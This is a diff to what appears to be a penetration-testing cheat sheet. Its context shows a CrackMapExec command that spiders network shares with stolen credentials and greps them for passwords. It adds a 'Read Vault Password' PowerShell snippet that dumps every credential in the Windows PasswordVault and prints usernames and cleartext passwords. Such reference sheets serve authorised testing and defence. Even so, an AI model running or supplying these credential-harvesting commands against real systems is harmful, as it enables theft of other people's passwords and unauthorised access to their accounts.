@@ -412,3 +412,14 @@ you `grep` those files to find secrets.
 cme {IP} -d {DOMAIN} -u {USERNAME} -p {PASSWORD} -m spider_plus
 grep ./output_folder "password"
 ```
+
+
+### Read Vault Password
+
+```powershell
+[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object {
+    $_.RetrievePassword()
+    Write-Host "[" $_.Resource "] " $_.Username ": " $_.Password
+}
+```
